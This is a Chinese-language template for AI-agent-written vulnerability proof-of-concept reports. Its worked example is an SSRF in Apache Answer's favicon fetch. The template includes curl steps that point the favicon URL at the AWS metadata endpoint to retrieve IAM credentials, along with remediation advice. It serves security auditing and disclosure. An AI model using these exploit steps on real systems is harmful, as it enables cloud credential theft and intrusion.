# PoC 漏洞利用报告模板（真实漏洞 TP）

> 当 Phase 4 子 Agent 判定漏洞为 **TP（真实漏洞）** 时使用本模板。
> 输出文件命名：`poc-V-{NNN}.md`，写入到 `{target_project}/reports/`。

---

# {ProjectName} 存在 {VulnTitle} 漏洞

> 示例：`Apache Answer 存在 SSRF - Favicon/图标获取无 URL 校验漏洞`

## 项目描述

（根据项目 README 生成，**约 100 字**。说明项目用途、主要功能、技术栈、活跃度/采用情况）

> 示例：Apache Answer 是一款开源的问答社区平台，定位为 Stack Overflow 的开源替代品。后端使用 Go + Gin + XORM，前端 React。支持问答、标签、用户管理、插件扩展，常用于团队知识库、产品社区。GitHub star 13k+，Apache 顶级项目。

## 项目启动方式

（从 README 中提取，**完整可执行的命令**。优先 docker / docker-compose，其次 make / 原生命令）

```bash
# 示例（docker-compose）
git clone https://github.com/apache/incubator-answer.git
cd incubator-answer
docker-compose up -d

# 等待服务启动（约 30s）
curl -s http://127.0.0.1:9080/healthz
```

> 若 README 中提供多种启动方式，选用最简洁、依赖最少的一种。

## 漏洞描述

（**约 50 字**。说明漏洞类型、触发位置、危害本质）

> 示例：管理员设置站点 favicon 时，后端 `GetPicByUrl` 直接 `http.Get(url)` 拉取图标，未做 URL 校验、协议限制、内网屏蔽，导致 SSRF。

## 漏洞等级

**High** / Medium（二选一，与主审计报告一致）

## 漏洞利用前置条件

- **登录要求**：（是否需要登录？需要什么角色？）
- **权限要求**：（如管理员、特定 group）
- **配置要求**：（如某 feature flag 开启、某模块加载）
- **跳板要求**：（是否依赖前序漏洞）

> 示例：
> - 登录要求：需要管理员账号
> - 权限要求：站点设置（site-info）写权限
> - 配置要求：无（默认配置可触发）

## 漏洞影响

（详细说明利用后果，包括但不限于）

- 可访问/读取的资源（内网服务、云元数据、本地文件）
- 数据泄露范围
- 是否能达成 RCE / 写入 / 权限提升
- 横向移动可能性

> 示例：可访问服务器内网任意 HTTP 服务、AWS/GCP/阿里云 metadata 端点（窃取临时凭证）、进行内网端口扫描；若服务运行在容器中，可访问 K8s API server `https://kubernetes.default.svc`。

---

## 代码审计证明

### 入口
（用户输入读取的位置，`file:line`）

```go
// 示例
// internal/controller/siteinfo_controller.go:120
url := req.FaviconURL  // 来自 admin 用户 POST body
```

### 数据流
（从入口到 sink 的完整调用链，每一跳标注 `file:line`）

```
controller.UpdateSiteInfo @ siteinfo_controller.go:120
  → service.UpdateBranding @ siteinfo_service.go:88
    → htmltext.GetPicByUrl @ pkg/htmltext/htmltext.go:192
```

### Sink
（最终危险调用点，贴出关键代码片段）

```go
// pkg/htmltext/htmltext.go:192-205
func GetPicByUrl(url string) string {
    res, err := http.Get(url)  // 无任何 URL 校验
    if err != nil {
        return ""
    }
    defer res.Body.Close()
    pix, _ := io.ReadAll(res.Body)
    return string(pix)
}
```

---

## 漏洞利用证明

### 环境准备

（实际执行过的启动命令 + 关键输出）

```bash
$ docker-compose up -d
Creating network "answer_default" with the default driver
Creating answer_db_1 ... done
Creating answer_app_1 ... done

$ curl -s http://127.0.0.1:9080/healthz
{"status":"ok"}
```

### 利用步骤

#### Step 1：登录管理员账号，获取 session

```bash
$ curl -s -c cookie.txt -X POST 'http://127.0.0.1:9080/answer/api/v1/user/login/email' \
    -H 'Content-Type: application/json' \
    -d '{"e_mail":"admin@example.com","pass":"admin123"}'
# 响应：{"code":0,"data":{"access_token":"eyJ..."}}
```

#### Step 2：构造 SSRF payload，请求云元数据

```bash
$ curl -s -X PUT 'http://127.0.0.1:9080/answer/api/v1/admin/siteinfo/branding' \
    -H 'Authorization: Bearer eyJ...' \
    -H 'Content-Type: application/json' \
    -d '{"favicon":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
```

#### Step 3：触发服务端 SSRF（任意调用 favicon 显示接口）

```bash
$ curl -i 'http://127.0.0.1:9080/favicon.ico'

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 287

{
  "Code": "Success",
  "AccessKeyId": "ASIA....",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2026-05-13T22:00:00Z"
}
```

### 验证结果

- **✅ 已在 docker 环境真实运行验证**
- 实际响应：服务端代理返回了 AWS metadata 服务返回的 IAM 凭据 JSON
- 攻击载荷大小：~150 bytes
- 单次请求耗时：~80ms

> **若未真实运行（环境搭建失败）**：标注此处为「❌ 未运行验证，仅静态推理」，并给出**可执行的 PoC 命令**让后续人员手动验证。例如：
>
> ```bash
> # 未运行验证。推荐复现步骤：
> # 1. 按上文「项目启动方式」启动 docker-compose
> # 2. 登录管理员并获取 token
> # 3. 执行 Step 2 / Step 3 即可观察 SSRF 响应
> ```

---

## 修复建议

（参考主审计报告 §3.3，简要列出落地修复方向）

- 建议 1：协议白名单（仅 http/https）
- 建议 2：屏蔽内网/metadata IP 段
- 建议 3：禁止/限制重定向（`CheckRedirect`）
- 建议 4：设置超时（`http.Client.Timeout`）

---

## 关联信息

- 对应主审计报告：`{project}-audit-{YYYY-MM-DD}.md` 的 `V-{NNN}` 条目
- 验证 Agent ID：（子 Agent 标识，便于追溯）
- 验证时间：（YYYY-MM-DD HH:MM:SS）
